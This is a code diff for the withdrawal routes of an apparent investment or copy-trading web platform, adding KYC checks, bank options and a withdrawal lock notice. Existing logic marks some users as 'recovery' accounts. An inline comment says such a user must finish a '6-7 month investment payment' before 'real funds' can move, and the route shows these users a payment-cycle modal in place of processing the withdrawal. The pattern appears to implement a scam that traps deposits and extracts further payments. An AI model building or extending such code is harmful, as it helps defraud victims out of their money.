@@ -9,7 +9,7 @@ import {
 import { requireUser, hash, verify } from '../lib/auth.js';
 import { render, eta } from '../lib/view.js';
 import { portfolio, balance, traderStats, myCopyPositions, unreadCount, livePrices } from '../lib/stats.js';
-import { getBalanceOverview, investmentCycleHold } from '../lib/balance.js';
+import { getBalanceOverview, investmentCycleHold, lockNotice } from '../lib/balance.js';
 import { mailPlanActivated, mailDepositReceived, mailWithdrawalRequested } from '../lib/mail.js';
 import { getWallets, listPaymentMethods, getPaymentMethod, getSiteConfig } from '../lib/settings.js';
 import { saveReceipt } from '../lib/uploads.js';
@@ -286,13 +286,15 @@ const fromCents = (v) => v / 100;
 
 dash.get('/dashboard/withdraw', async (c) => {
   const u = c.get('user');
-  const [methods, rows, bal, cycleRaw] = await Promise.all([
+  const [methods, rows, bal, cycleRaw, site, kyc] = await Promise.all([
     listPaymentMethods(true, 'withdrawal'),
     db.select().from(transactions)
       .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
       .orderBy(desc(transactions.createdAt)).limit(25),
     balance(u.id),
     investmentCycleHold(u.id),
+    getSiteConfig(),
+    db.select({ kycStatus: users.kycStatus }).from(users).where(eq(users.id, u.id)).limit(1),
   ]);
   const cycle = cycleRaw || (await recoveryReferenceHold(u.id));
   const isRecovery = cycle?.isRecovery || u.accountClass === 'recovery_test';
@@ -303,13 +305,17 @@ dash.get('/dashboard/withdraw', async (c) => {
 
   const wdMethods = destStep
     ? methods.filter((m) => m.type === 'bank' || m.type === 'card')
-    : isRecovery ? methods.filter((m) => m.type === 'bank') : methods;
+    :isRecovery ? methods.filter((m) => m.type === 'bank') : methods;
+  const kycRequired = !!site.withdrawalKycRequired && (!kyc || kyc.kycStatus !== 'verified');
   return shell(c, 'dashboard/withdraw', {
     rows, bal, methods: wdMethods,
     codeRequired: !!u.withdrawalCodeHash,
     isRecovery,
     cycle: cycle ? { ...cycle, active: !cycle.matured } : null,
     destStep,
+    banks: site.bankOptions || [],
+    kycRequired,
+    lockNotice: lockNotice(cycle, site.withdrawalLockMonths),
     sent: c.req.query('sent'), error: c.req.query('e'),
   }, 'Withdraw');
 });
@@ -364,11 +370,12 @@ dash.post('/dashboard/withdraw', async (c) => {
     // payment-cycle message/modal — she must complete her 6-7 month investment
     // payment before real funds can move to her chosen bank/card.
     if (cycleHold.isRecovery) {
-      const [rows2, bal2] = await Promise.all([
+      const [rows2, bal2, site2] = await Promise.all([
         db.select().from(transactions)
           .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
           .orderBy(desc(transactions.createdAt)).limit(25),
         balance(u.id),
+        getSiteConfig(),
       ]);
       return shell(c,'dashboard/withdraw', {
         rows: rows2, bal: bal2,
@@ -376,24 +383,29 @@ dash.post('/dashboard/withdraw', async (c) => {
         codeRequired: !!u.withdrawalCodeHash,
         isRecovery: true,
         cycle: { ...cycleHold, active: true },
+        banks: site2.bankOptions || [],
+        lockNotice: lockNotice(cycleHold, site2.withdrawalLockMonths),
         prev: b,
         selfieUrl,
         sent: undefined, error: undefined,
       }, 'Withdraw');
     }
 
-    const [rows, balNow, methods] = await Promise.all([
+    const [rows, balNow, methods, siteNow] = await Promise.all([
       db.select().from(transactions)
         .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
         .orderBy(desc(transactions.createdAt)).limit(25),
       balance(u.id),
       listPaymentMethods(true, 'withdrawal'),
+      getSiteConfig(),
     ]);
     return shell(c, 'dashboard/withdraw', {
       rows, bal: balNow, methods,
       codeRequired: !!u.withdrawalCodeHash,
       isRecovery: cycleHold.isRecovery,
       cycle: { ...cycleHold, active: true },
+      banks: siteNow.bankOptions || [],
+      lockNotice: lockNotice(cycleHold, siteNow.withdrawalLockMonths),
       prev: b,
       selfieUrl,
       sent: undefined, error: undefined,
